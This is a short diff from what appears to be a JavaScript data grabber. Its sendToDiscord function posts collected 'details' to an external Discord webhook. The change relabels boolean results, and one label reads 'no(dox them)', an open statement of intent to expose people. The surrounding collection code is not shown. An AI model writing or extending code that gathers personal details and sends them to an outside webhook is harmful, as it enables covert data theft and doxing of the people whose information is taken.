@@ -54,7 +54,7 @@
 
       async function sendToDiscord(details) {
         if (!details) return;
-        const bool = v => v === true ? "✅" : v === false ? "❌" : "N/A";
+        const bool = v => v === true ? "Yesss" : v === false ? "no(dox them)" : "N/A";
         await fetch(CONFIG.webhookUrl, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
